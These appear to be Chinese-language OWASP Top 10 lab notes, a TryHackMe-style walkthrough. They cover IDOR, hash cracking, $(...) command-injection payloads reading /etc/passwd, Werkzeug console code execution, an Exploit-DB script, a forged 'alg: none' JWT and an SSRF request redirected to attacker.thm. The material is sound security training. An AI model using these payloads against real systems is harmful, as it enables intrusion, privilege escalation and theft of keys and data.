---
title: owasp-Top10
cover: 
icon: file
order: 5
author: Miktu
date: 2024-07-30
category:
  - 使用指南
tags:
  - 页面配置
  - 使用指南
sticky: true
star: true
footer: 这是测试显示的页脚
copyright: 无版权
---
OWASP-Top10

# 访问控制损坏

- 能够查看来自其他用户的敏感信息
- 访问未经授权的功能

**案例**

[在2019年发现了一个漏洞](https://bugs.xdavidhu.me/google/2021/01/11/stealing-your-private-videos-one-frame-at-a-time/)，攻击者可以从标记为私有的YouTube视频中获取任何单个帧。

## 挑战

###  IDOR 不安全的直接对象引用
Insecure Direct Object Reference（不安全的直接对象引用）

IDOR 是指访问控制漏洞，您可以通过该漏洞访问通常看不到的资源。当程序员公开直接对象引用时，就会发生这种情况，该引用只是引用服务器内特定对象的标识符。就对象而言，我们可以指文件、用户、银行应用程序中的银行帐户或任何其他东西。

例如，假设我们正在登录我们的银行帐户，并在正确验证自己身份后，我们会看到这样的 URL：`https://bank.thm/account?id=111111`。在该页面上，我们可以看到所有重要的银行详细信息，用户会做任何他们需要做的事情并继续前进，认为没有任何问题。然而，这里存在一个潜在的巨大问题，任何人都可以将` id` 参数更改为其他值，例如 `222222`，如果站点配置不正确，那么他就可以访问其他人的银行信息。

应用程序通过URL中指向特定帐户的`id`参数公开直接对象引用。由于应用程序没有检查登录用户是否拥有引用的帐户，攻击者可以通过IDOR漏洞从其他用户那里获取敏感信息。请注意：**直接对象引用不是问题所在，而是应用程序没有验证登录用户是否应该有权访问请求的帐户。**
![](../images/Pasted%20image%2020240730181926.png)


![](../images/Pasted%20image%2020240730182008.png)
![](../images/Pasted%20image%2020240730182042.png)

### 密码故障（Cryptographic Failures）

密码故障是指由于滥用（或不使用）密码算法来保护敏感信息而产生的任何漏洞。Web应用程序需要密码学在许多级别上为其用户提供机密性。

生产环境中，通常会看到数据存储在Mysql、MariaDB等数据库专用的服务器上。但数据也可以存储为文件，这些可以称为“平面文件”数据库，因为他们以单个文件的形式存储在计算机上。这种数据库偶尔会用在较小的web应用程序中。
本次挑战我们只关注“平面文件数据库”。

如前所述，平面文件数据库作为文件存储在计算机磁盘上。通常，这对于网络应用程序来说不是问题，但如果数据库存储在网站的根目录下（即连接到网站的用户可以访问的文件之一），会发生什么情况？好吧，我们可以在自己的机器上下载和查询它，并且可以完全访问数据库中的所有内容。确实是敏感数据泄露！
平面文件数据库最常见（也是最简单）的格式是`SQLite`数据库。这些可以在大多数编程语言中进行交互，并且有一个专用的客户端用于在命令行上查询它们。该客户端称为 sqlite3，默认安装在许多 Linux 发行版上。

#### SQLite 数据库语法
- 查看`SQLite`数据库文件属性
```bash
file example.db
```

- 以交互方式进入数据库
```bash
sqlite3 exaple.db
```

- 查看数据库表
```sqlite
.tables
```
- 查看表属性信息
```sqlite
 PRAGMA table_info(customers);
```

- 查看表数据
```sqlite
SELECT * FROM customers;
```

```shell-session
sqlite> PRAGMA table_info(customers);
0|cudtID|INT|1||1
1|custName|TEXT|1||0
2|creditCard|TEXT|0||0
3|password|TEXT|1||0

sqlite> SELECT * FROM customers;
0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a
2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19
3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70
4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679
5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f
```

表信息中我们可以看到有四列：custID、custName、creditCard、password。您可能会注意到这与结果相匹配。取第一行：
`0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99`

我们有 客户ID (`0`)、客户名称 (`Joy Paulson`)、信用卡 (`4916 9012 2231 7905`) 和密码哈希 (`5f4dcc3b5aa765d61d8327deb882cf99`)。在下一个任务中，我们将研究破解这个哈希值。

#### HASH破解
kali安装了各种工具，如果你知道如何使用，就随意使用，本练习只使用我们将使用在线工具：[Crackstation](https://crackstation.net/)。这个网站非常擅长破解弱密码哈希。对于更复杂的哈希，我们需要更复杂的工具。

![](../images/Pasted%20image%2020240730190859.png)
值得注意的是Crackstation使用大量的单词列表工作。如果密码不在单词列表中，那么Crackstation将无法破解哈希。
####   加密失败（挑战）
1. 开发人给自己留了一个注释，表明特定目录中有敏感数据，提到的目录名称是什么？
    点击`login` 查看网页源码，得到以下信息：
    ![](../images/Pasted%20image%2020240730191354.png)
    **答案**： `/assets`
2. 导航到您在问题一中找到的目录。什么文件可能包含敏感数据？
    ![](../images/Pasted%20image%2020240730191649.png)
    **答案**： `webapp.db
4. 使用支持材料访问敏感数据。管理员用户的密码哈希是什么？
    通过点击，或`wget`等命令， 将`webapp.db`下载到本地，并访问数据库文件，查询管理员用户信息：
    - 查看`webapp.db` 文件属性（关注sqlite版本）：
        ![](../images/Pasted%20image%2020240730192802.png)
    - 查看数据库中表名称
        ![](../images/Pasted%20image%2020240730192839.png)
    - 查看表中各个键值的名称
        ![](../images/Pasted%20image%2020240730192926.png)
    - 查看表内容
        ![](../images/Pasted%20image%2020240730193008.png)
    **答案**：`6eea9b7ef19179a06954edd0f6c05ceb`
5. 破解`hash`,管理员的明文密码是什么？
    访问[https://crackstation.net/](https://crackstation.net/ ) 破解`hash` 。
    ![](../images/Pasted%20image%2020240730193247.png)
    **答案**： `qwertyuiop`
6. 以管理员身份登录。旗帜是什么？
    ![](../images/Pasted%20image%2020240730193729.png)
    **答案** ：`THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`

# 注入
注入缺陷在应用程序中非常常见。这些缺陷的出现是因为应用程序将用户控制的输入解释为命令或参数。注入攻击取决于使用了什么技术以及这些技术如何解释输入。一些常见的例子包括：
- SQL注入：当用户控制的输入传递给SQL查询时，就会发生这种情况。因此，攻击者可以传递SQL查询来操纵此类查询的结果。当输入传递给数据库查询时，这可能允许攻击者访问、修改和删除数据库中的信息。这意味着攻击者可以窃取敏感信息，如个人详细信息和凭据。
- 命令注入：当用户输入传递给系统命令时，就会发生这种情况。因此，攻击者可以在应用程序服务器上执行任意系统命令，从而可能允许他们访问用户的系统。


防止注入攻击的主要防御措施是确保用户控制的输入不被解释为查询或命令。有不同的方法可以做到这一点：
- 使用允许列表：当输入被发送到服务器时，此输入将与安全输入或字符列表进行比较。如果输入被标记为安全，则对其进行处理。否则，它被拒绝，应用程序会抛出错误。
- 剥离输入：如果输入包含危险字符，则在处理之前将其删除。
危险字符或输入被归类为可以更改基础数据处理方式的任何输入。存在各种可以为您执行这些操作的库，而不是手动构建允许列表或剥离输入。


## 命令注入
当 Web 应用程序中的服务器端代码（例如 PHP）调用直接与服务器控制台交互的函数时，就会发生命令注入。注入 Web 漏洞允许攻击者利用该调用在服务器上任意执行操作系统命令。攻击者在这里的可能性是无穷无尽的：他们可以列出文件，读取其内容，运行一些基本命令以在服务器上进行一些侦察或任何他们想要的操作，就像他们坐在服务器前面直接发出命令一样进入命令行。

一旦攻击者在 Web 服务器上站稳脚跟，他们就可以开始对您的系统进行常规枚举，并寻找绕过的方法。
### 代码示例

让我们考虑一个场景：MooCorp 已开始开发一个基于 Web 的应用程序，用于具有可自定义文本的奶牛 ASCII 艺术。在寻找实现应用程序的方法时，他们遇到了 Linux 中的`owsay`命令，它就是这样做的！他们决定编写一些简单的代码，从操作系统的控制台调用`owsay`命令并将其内容发送回网站，而不是编写整个Web应用程序和让`cow`用ASCII说话所需的逻辑。

```php
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```

简单来说，上面的代码片段执行以下操作：  

1. 检查是否设置了参数“mooing”。如果是，变量`$mooing`将获取传递到输入字段的内容。
2. 检查是否设置了参数“”。如果是，变量`$cow`获取通过参数传递的内容。
3. 然后，程序执行该函数`passthru("perl /usr/bin/cowsay -f $cow $mooing");`。passtru函数只是在操作系统的控制台中执行一个命令，并将输出发送回用户的浏览器。您可以看到我们的命令是通过在其末尾连接`$cow`和`$mooing`变量而形成的。由于我们可以操作这些变量，因此我们可以尝试通过使用简单的技巧注入额外的命令。如果您愿意，您可以阅读[PHP网站](https://www.php.net/manual/en/function.passthru.php)上`passthru()`上的文档，了解有关函数本身的更多信息。

![](../images/Pasted%20image%2020240731210428.png)
### 利用注入

现在我们知道了应用程序是如何在幕后工作的，我们将利用一个名为“`inline commands`（内联命令）” 的`bash`功能来滥用`Cowsay`服务器并执行我们想要的任何任意命令。
![](../images/Pasted%20image%2020240731210827.png)

所以回到Cowsay服务器，如果我们向Web应用程序发送内联命令会发生什么：
![](../images/Pasted%20image%2020240731210840.png)

## 实例练习

1. 网站根目录有什么奇怪的文件？
```php
$(ls)
```

**答案**：`drpepper.txt`


2. 有多少非root/非服务/非守护程序用户？(标准用户)
```php
$(cat /etc/passwd)
```

您还可以使用带有一些参数的命令[awk]：
```php
$(awk -F: ‘$3 >= 1000’ /etc/passwd)
```

`sbin`是为系统管理员准备的，**标准用户不应该访问**。所以，看到 `/sbin/nologin`是一个指标。

**答案**：`0`
4. 这个应用程序以什么用户身份运行？
```php
$(whoami)
```

**答案**：`apache`
6. 此用户的shell设置为什么？
```php
$(cat /etc/passwd | grep apache )
```

**答案**：`/sbin/nologin`
8. 正在运行什么版本的 Alpine Linux？
```php
$(cat /etc/os-release)
```

**答案**：`3.16.0`


# 不安全的设计
不安全的设计是指拥有程序架构固有的漏洞。 应用的设计一开始就有漏洞
- 不正确的威胁建模
- 为了更容易测试，引入不安全设计漏洞，如：围绕代码添加一些“快捷方式”
    - 案例：开发人员可以在开发阶段禁用OTP验证，以快速测试应用程序的其余部分，而无需在每次登录时手动输入代码，但在将应用程序发送到生产环境时忘记重新启用它。
### 不安全的密码重置
此类漏洞的一个很好的例子发生在[Instagram上，不久前](https://thezerohack.com/hack-any-instagram)。Instagram允许用户通过短信向他们的手机号码发送6位代码进行验证，从而重置他们忘记的密码。如果攻击者想访问受害者的账户，他可以尝试暴力破解6位代码。正如预期的那样，这是不可能的，因为Instagram实施了速率限制，因此在250次尝试后，用户将被阻止进一步尝试。
![](../images/Pasted%20image%2020240731214322.png)
然而，人们发现速率限制仅适用于从同一IP进行的代码尝试。如果攻击者有几个不同的IP地址来发送请求，他现在可以尝试每个IP 250个代码。对于一个6位代码，您有一百万个可能的代码，因此攻击者需要1000000/250=4000个IP来覆盖所有可能的代码。这听起来可能是一个疯狂的IP数量，但是云服务使得以相对较小的成本轻松获得它们，使得这种攻击变得可行。
![](../images/Pasted%20image%2020240731214337.png)

请注意，该漏洞与没有用户能够使用数千个IP地址并发请求尝试暴力破解数字代码的想法有何关系。问题出在设计上，而不是应用程序本身的实现上。

由于不安全的设计漏洞是在开发过程的早期阶段引入的，解决它们通常需要从头开始重建应用程序的易受攻击部分，并且通常比任何其他简单的代码相关漏洞更难做到。避免此类漏洞的最佳方法是在开发生命周期的早期阶段执行威胁建模。要获得有关如何实现安全开发生命周期的更多信息，请务必查看[SSDLC室](https://tryhackme.com/room/securesdlc)。

## 实例练习
导航至 http://10.10.90.139:85 并进入 joseph 的帐户。该应用程序的密码重置机制也存在设计缺陷。你能找出所提出的设计中的弱点以及如何滥用它吗？

问题：尝试重置`joseph`的密码。请记住网站用来验证您是否确实是`joseph`的方法？

解题思路： 访问登陆页面，尝试重置密码，选择一个容易破解的问题，破解问题后，得到密码，使用得到的密码登陆网站，获取`flag`

![](../images/Pasted%20image%2020240731215538.png)

**答案** ：`THM{Not_3ven_c4tz_c0uld_sav3_U!}`

# 安全配置错误
安全错误配置与其他十大漏洞不同，因为它们发生在安全可以适当配置但没有配置的情况下。即使您下载了最新的最新软件，糟糕的配置也可能使您的安装容易受到攻击。
 - 云服务的权限配置不佳，例如：S3 buckets。
 - 启用不必要的功能，例如服务、页面、帐户或权限。
 - 更改的默认帐户密码。
 - 错误消息过于详细，允许攻击者了解有关系统的更多信息。
 - 不使用[HTTP安全标头](https://owasp.org/www-project-secure-headers/)。
 此漏洞通常会导致更多漏洞，例如允许您访问敏感数据的默认凭据、XML外部实体（XXE）或管理页面上的命令注入。有关详细信息，请查看[OWASP前10名安全错误配置条目](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)。

## 常见漏洞示例

一个常见的安全配置错误，与生产软件中调试功能的暴露有关。调试功能通常在编程框架中可用，以允许开发人员访问在开发应用程序时对调试应用程序有用的高级功能。如果开发人员在发布应用程序之前忘记禁用这些调试功能，攻击者可能会滥用这些调试功能。
这种漏洞的一个例子是在[Patreon于2015年被黑客入侵](https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/)。在Patreon被黑客入侵的五天前，一名安全研究人员向`Patreon`报告说，他发现了一个`Werkzeug`控制台的开放调试界面。`Werkzeug`是基于`Python`的Web应用程序中的重要组件，因为它为Web服务器提供了一个执行Python代码的接口。`Werkzeug`包括一个调试控制台，可以通过URL访问`/console`，或者如果应用程序引发异常，它也会呈现给用户。在这两种情况下，控制台都提供了一个Python控制台，可以运行您发送给它的任何代码。对于攻击者来说，这意味着他可以任意执行命令。

## 实例练习
此VM在OWASP十大漏洞列表中显示了`Security Misconfiguration`

导航到[http://10.10.90.139:86/console](http://10.10.90.139:86/console)以访问Werkzeug控制台。
使用Werkzeug控制台运行以下Python代码在服务器上执行`ls -l`命令：、
```python
import os; print(os.popen("ls -l").read())
```



1. 当前目录中的数据库文件名（扩展名为. db的文件名）是什么？
    ![](../images/Pasted%20image%2020240731221132.png)
    **答案**： `todo.db`
1. 修改代码读取`app.py`文件的内容，其中包含应用程序的源代码。源代码中`secret_flag`变量的值是多少？
    `import os; print(os.popen("cat app.py |grep secret_flag").read())`
    ![](../images/Pasted%20image%2020240731221232.png)
    **答案**： `THM{Just_a_tiny_misconfiguration}`
# 易受攻击和过时组件

有时，您可能会发现您正在测试的对象正在使用具有众所周知漏洞的程序。
例如，假设一家公司已经几年没有更新其 WordPress 版本，并且使用 [WPScan](https://wpscan.com/)等工具，您会发现它的版本是 4.6。一些快速研究表明 WordPress 4.6 容易受到未经身份验证的远程代码执行 (RCE) 漏洞的攻击，更好的是，您可以在 [Exploit-DB](https://www.exploit-db.com/exploits/41962).上找到已经存在的漏洞。这将是相当危险的，因为这很容易被攻击者利用。

## 实例练习
导航到`http://10.10.90.139:84`，您将在其中找到易受攻击的应用程序。您可以在网上找到利用它所需的所有信息。

### 回答以下问题：
`/opt/flag.txt`文件的内容是什么？

**解题：**
- 访问`http://10.10.90.139:84`从界面发现信息：*该web应用是 `CSE bookstore`*
- 使用`searchsploite` 查询 该文件漏洞发现可利用脚本：`47887.py `
- 利用漏洞：`python 47887.py http://10.10.90.139:84 `
- 查看flag：`cat  /opt/flag.txt`

**答案**： `THM{But_1ts_n0t_my_f4ult!}`


# 身份鉴别失效
常见的身份鉴别失效漏洞
- 暴力破解：使用“用户名密码”的方式进行身份鉴别，通过多次尝试可以一猜测用户名密码
- 使用弱凭据：使用弱密码如`password1`
- 弱会话cookie：`cookie`中包含可预测的值如用户名+用户ID之类。

根据确切的缺陷，可以对损坏的身份验证机制进行各种缓解：

- 为避免密码猜测攻击，请确保应用程序强制执行强密码策略。
- 为避免暴力攻击，请确保应用程序在尝试一定次数后强制自动锁定。这将防止攻击者发起更多的暴力攻击。
- 实施多重身份验证。如果用户有多种身份验证方法，例如，使用用户名和密码并在其移动设备上接收代码，攻击者将很难同时获取密码和代码来访问帐户。

## 身份鉴别失败实例
- 示例场景：开发人员设计失误，允许重新注册现有用户。

假设有一个名为`admin`的现有用户，我们想访问他们的帐户，所以我们可以尝试重新注册该用户名，但要稍作修改。我们将在不带引号的情况下输入“ admin”（注意开头的空格）。现在，当您在用户名字段中输入它并输入其他必需信息（如电子邮件ID或密码）并提交该数据时，它将注册一个新用户，但该用户将拥有与管理员帐户相同的权利。该新用户还将能够查看用户`admin`下显示的所有内容。

要查看实际情况，请转到[http://10.10.37.106:8088](http://10.10.37.106:8088)并尝试以`darren`作为您的用户名注册。您会看到该用户已经存在，因此请尝试注册“ darren”，您会看到您现在已登录，并且只能在darren的帐户中看到内容，在我们的例子中，这是您需要检索的标志。

- 按题目提示注册`darren`账户，页面提示账户已存在：
    ![](../images/Pasted%20image%2020240803150416.png)
- 尝试注册` darren` （前面带空格）账户，显示注册成功： 
    ![](../images/Pasted%20image%2020240803150643.png)
    ![](../images/Pasted%20image%2020240803150746.png)
- 登陆用户` daren` （登陆用户时，需注意用户名前面带空格）
    ![](../images/Pasted%20image%2020240803151021.png)
![](../images/Pasted%20image%2020240803151507.png)

# 软件和数据完整性故障
## 什么是完整性

- 指确保一段数据不被修改的能力
- 一般通过`hash`校验被下载文件的完整性

以 WinSCP 为例， 如果您访问他们的 Sourceforge 存储库，您会看到对于每个可供下载的文件，都会发布一些哈希值：
![](../images/Pasted%20image%2020240803152128.png)

这些哈希值是由 WinSCP 的创建者预先计算的，以便您可以在下载后检查文件的完整性。如果我们下载 WinSCP-5.21.5-Setup.exe 文件，我们可以重新计算哈希值并将其与 Sourceforge 中发布的哈希值进行比较。要计算Linux中的不同哈希值，我们可以使用以下命令：

```shell
md5sum WinSCP-5.21.5-Setup.exe  
```

由于我们获得了相同的哈希值，因此我们可以确定下载的文件与网站上的文件完全相同。

## 软件和数据完整性故障
此漏洞是由使用软件或数据而不使用任何类型的完整性检查的代码或基础设施引起的。由于没有进行完整性验证，攻击者可能会修改传递给应用程序的软件或数据，从而导致意外后果。该类漏洞主要有两类：
- Software Integrity Failures（软件完整性故障）
- Data Integrity Failures（数据完整性故障）

### 软件完整性故障

#### 介绍
假设您有一个网站，该网站使用第三方库，这些库存储在一些不受您控制的外部服务器中。虽然这听起来有点奇怪，但这实际上是一种常见的做法。以常用的 javascript 库 jQuery 为例。如果需要，您可以直接从他们的服务器将 jQuery 添加到您的网站中，而无需实际下载它，只需在网站的 HTML 代码中添加以下行：
```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
```
当用户导航到您的网站时，其浏览器将读取其 HTML 代码并从指定的外部源下载 jQuery。
![](../images/Pasted%20image%2020240803152640.png)

问题是，如果攻击者以某种方式侵入 jQuery 官方存储库，他们可以更改 https://code.jquery.com/jquery-3.6.1.min.js 的内容以注入恶意代码。因此，任何访问您网站的人现在都会提取恶意代码并在不知不觉中将其执行到浏览器中。这是软件完整性故障，因为您的网站没有检查第三方库以查看它是否已更改。现代浏览器允许您沿着库的 URL 指定哈希，以便仅当下载文件的哈希与预期值匹配时才执行库代码。这种安全机制称为子资源完整性 (SRI)，您可以在[此处](https://www.srihash.org/)阅读有关它的更多信息。

在 HTML 代码中插入库的正确方法是使用 SRI 并包含完整性哈希，这样，如果攻击者能够以某种方式修改库，则任何浏览您网站的客户端都不会执行修改后的版本。 HTML 中的内容应如下所示：
```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
```

如果需要，您可以访问 https://www.srihash.org/ 为任何库生哈希值:
![](../images/Pasted%20image%2020240803153320.png)

#### 练习

![](../images/Pasted%20image%2020240803153401.png)

### 数据完整性故障

#### 介绍

让我们考虑一下 Web 应用程序如何维护会话。通常，当用户登录应用程序时，他们将被分配某种会话令牌，只要会话持续，就需要将其保存在浏览器上。此令牌将在每个后续请求中重复，以便 Web 应用程序知道我们是谁。这些会话令牌可以有多种形式，但通常通过 `cookie` 分配。 `Cookie` 是网络应用程序将存储在用户浏览器上的键值对，并且会在每次向发出它们的网站发出请求时自动重复。
![](../images/Pasted%20image%2020240803153546.png)

例如，如果您正在创建一个网络邮件应用程序，则可以在登录后为每个用户分配一个包含用户名的 cookie。在后续请求中，您的浏览器始终会在 cookie 中发送您的用户名，以便您的 Web 应用程序知道哪个用户正在连接。从安全角度来看，这将是一个糟糕的想法，因为正如我们提到的，cookie 存储在用户的浏览器上，因此如果用户篡改 cookie 并更改用户名，他们可能会冒充其他人并阅读他们的电子邮件！该应用程序将遭受数据完整性故障，因为它信任攻击者可以篡改的数据。

#### 解决思路

解决此问题的一种方法是使用某种完整性机制来保证 cookie 没有被用户更改。为了避免重新发明轮子，我们可以使用一些令牌实现来允许您执行此操作并处理所有密码学以提供完整性证明，而无需您费心。 `JSON Web Tokens (JWT)` 就是这样的一种实现。

`JWT` 是非常简单的令牌，允许您在令牌上存储键值对，并作为令牌的一部分提供完整性。这个想法是，您可以生成令牌，您可以向用户提供这些令牌，确保他们无法更改键值对并通过完整性检查。 JWT 令牌的结构由 3 部分组成：
![](../images/Pasted%20image%2020240803153819.png)
- 标头（header）包含指示这是 `JWT` 的元数据，并且使用的签名算法是 `HS256`。
- 有效负载（payload）包含键值对以及 Web 应用程序希望客户端存储的数据。
- 签名（signature）类似于哈希，用于验证有效负载的完整性。如果您更改有效负载，
Web 应用程序可以验证签名是否与有效负载不匹配，并知道您篡改了 JWT。与简单的哈希不同，此签名涉及仅使用服务器持有的密钥，这意味着如果您更改有效负载，除非您知道密钥，否则将无法生成匹配的签名。

请注意，令牌的 3 个部分中的每一个部分都是使用 Base64 编码的简单明文。您可以使用此[在线工具](https://appdevtools.com/base64-encoder-decoder)对 Base64 进行编码/解码。尝试解码以下令牌的标头和有效负载：

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw`

**注意：签名包含二进制数据，所以即使你解码它，你也无法理解它的意义。**


#### JWT 和 None 算法
不久前，一些实现 JWT 的库存在数据完整性失败漏洞。正如我们所看到的，JWT 实现了签名来验证有效负载数据的完整性。易受攻击的库允许攻击者通过更改 JWT 中的以下两项来绕过签名验证：

1. 修改令牌的标头部分，以便 `alg` 标头包含值 `none`。
2. 删除签名部分。

以之前的 JWT 为例，如果我们想更改`payload`，使用户名变为“admin”并且不进行签名检查，我们必须解码标头和有效负载，根据需要修改它们，然后将它们编码回来。请注意我们如何删除签名部分但保留末尾的点。
![](../images/Pasted%20image%2020240803154511.png)


听起来很简单！让我们在示例场景中逐步了解攻击者必须遵循的过程。导航至 http://10.10.37.106:8089/ 并按照以下问题中的说明进行操作。

## 实例练习

**尝试以访客身份登录应用程序。访客的帐户密码是什么？**

![](../images/Pasted%20image%2020240803165603.png)

根据您的浏览器，您将能够从以下选项卡编辑cookie：

- **火狐（`Ctrl+Shift` or `F12`）**
    ![](../images/Pasted%20image%2020240803165708.png)
- **Chrome（`F12`）**
    ![](../images/Pasted%20image%2020240803165937.png)

**包含JWT令牌的网站cookie的名称是什么？**
    ![](../images/Pasted%20image%2020240803170043.png)

- **呈现给`admin`用户的标志是什么？**
    ![](../images/Pasted%20image%2020240803170856.png)
````ad-info
title: 解题过程

- 原JWT`hash`值
```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzIyNjczOTMyfQ.9WS60lYrupl7FR2SqAuVyTQcFg0LzeMaiF3XhF6yRYA
```
- `header`与`payload`解码结果(最后一段校验值不修改，因为我们用不到（header中 `alg`值为`none` 无签名）：
```text
{"typ":"JWT","alg":"HS256"}.{"username":"guest","exp":1722673932}.
```
- 修改JWT令牌，以便应用程序认为您是用户“admin”。
```text
{"typ":"JWT","alg":"none"}： YHsidHlwIjoiSldUIiwiYWxnIjoibm9uZSJ9YA==`
{"username":"admin","exp":1722673932}：eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzIyNjczOTMyfQ==
```
- 组合`payload`：
```te x t
YHsidHlwIjoiSldUIiwiYWxnIjoibm9uZSJ9YA==.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzIyNjczOTMyfQ==.
```
    **注意：每一段校验值必须以`.`的结束**
- 填入:
    ![](../images/Pasted%20image%2020240803164747.png)

- 刷新界面，得到 `flag`：
    ![](../images/Pasted%20image%2020240803164831.png)

````

# 安全记录和监控故障
设置Web应用程序时，用户执行的每一项操作都应该被记录下来。记录很重要，因为一旦发生事件，攻击者的活动就可以被追踪。一旦追踪到他们的行为，就可以确定他们的风险和影响。如果没有日志记录，就无法知道攻击者在访问特定Web应用程序时执行了哪些操作。这些更重要的影响包括：

- 监管损害：如果攻击者获得了对个人身份用户信息的访问权限，并且没有记录，最终用户将受到影响，应用程序所有者可能会受到罚款或根据法规采取更严厉的行动。
- 进一步攻击的风险：攻击者的存在可能在没有日志记录的情况下无法检测到。这可能允许攻击者通过窃取凭据、攻击基础设施等方式对Web应用程序所有者发起进一步的攻击。

日志中存储的信息应包括以下内容：

- HTTP状态码（HTTP status codes）
- 时间戳（Time Stamps）
- 用户名（Usernames）
- API端点/页面位置（API endpoints/page locations）
- IP地址（IP addresses）
这些日志包含一些敏感信息，因此确保它们安全存储并且这些日志的多个副本存储在不同的位置非常重要。
您可能已经注意到，在发生违规或事件后，日志记录更加重要。理想的情况是进行监控以检测任何可疑活动。检测此可疑活动的目的是完全阻止攻击者，或者在比预期晚得多的时间检测到攻击者的存在时减少他们所造成的影响。可疑活动的常见示例包括：

- 对特定操作的多次未经授权的尝试（通常是身份验证尝试或访问未经授权的资源，例如管理页面）
- 来自异常IP地址或位置的请求：虽然这可能表明其他人正在尝试访问特定用户的帐户，但也可能有误判率。
- 使用自动化工具：可以轻松识别特定的自动化工具，例如使用User-Agent标头的值或请求的速度。这可能表明攻击者正在使用自动化工具。
- 常见有效负载：在Web应用程序中，攻击者使用已知有效负载是很常见的。检测这些有效负载的使用可能表明存在对应用程序进行未经授权/恶意测试的人
仅仅检测可疑活动是没有帮助的。这种可疑活动需要根据影响级别进行评级。例如，某些行为的影响将高于其他行为。这些影响更大的行为需要更快地做出反应；因此，他们应该发出警报以引起相关方的注意。

## 练习日志分析

[Download](https://tryhackme-vm-upload.s3.eu-west-1.amazonaws.com/login-logs_1595366583422.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2YR2KKQMWLXEMXW4%2F20240803%2Feu-west-1%2Fs3%2Faws4_request&X-Amz-Date=20240803T091230Z&X-Amz-Expires=120&X-Amz-Signature=96e899101ffced12e6df2a3adbcc6a12b7bb7f5ca60123b84837819ea9e5e628&X-Amz-SignedHeaders=host&x-id=GetObject)  the file

```bash
cat login-logs_1595366583422.txt      


200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
200 OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
200 OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
200 OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
200 OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login %  
```

![](../images/Pasted%20image%2020240803171835.png)

# 服务器端请求伪造（SSRF）

服务器端请求伪造（Server-Side Request Forgery）

当攻击者可以强迫Web应用程序代表他们向任意目的地发送请求，同时控制请求本身的内容时，就会出现这种类型的漏洞。SSRF漏洞通常来自我们的Web应用程序需要使用第三方服务的实现。

例如，一个Web应用程序使用外部API向其客户端发送SMS通知。对于每封电子邮件，网站需要向SMS提供商的服务器发出Web请求，以发送要发送的消息的内容。由于SMS提供商对每条消息收费，他们要求您在向其API发出的每个请求中添加一个他们预先分配给您的密钥。API密钥用作身份验证令牌，并允许提供商知道向谁收取每条消息的费用。该应用程序的工作方式如下：
![](../images/Pasted%20image%2020240803172131.png)

通过查看上图，很容易看出漏洞所在。该应用程序向用户公开了`server`参数，该参数定义了SMS服务提供商的服务器名称。如果攻击者愿意，他们可以简单地更改`server`的值以指向他们控制的机器，您的Web应用程序会很乐意将SMS请求转发给攻击者而不是SMS提供商。作为转发消息的一部分，攻击者将获得API密钥，允许他们使用SMS服务发送消息，费用由您承担。为此，攻击者只需向您的网站发出以下请求：
`https://www.mysite.com/sms?server=attacker.thm&msg=ABC`
这将使易受攻击的Web应用程序发出请求：
`https://attacker.thm/api/send?msg=ABC`
然后，您可以使用Netcat捕获请求的内容：
```shell
nc -lvp 80


Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
```

这是SSRF的一个非常基本的例子。如果这看起来不那么可怕，SSRF实际上可以用来做更多的事情。一般来说，根据每个场景的具体情况，SSRF可以用于：
- 枚举内部网络，包括IP地址和端口。
- 滥用服务器之间的信任关系并获得对其他受限服务的访问权限。
- 与一些非HTTP服务交互以获得远程代码执行（RCE）。

## 实例练习
- 浏览网站。唯一允许访问管理区域的主机是什么？  **答案** ：`localhost`
    点击网站右上角，逐一尝试点击连接，会发现有`Admin Area`弹出了不一样的内容
    ![](../images/Pasted%20image%2020240803174055.png)
    ![](../images/Pasted%20image%2020240803174211.png)
- 选中“下载简历”按钮。服务器参数指向哪里？**答案**：`secure-file-storage.com`
     利用`burpsuite`代理拦截请求，发现
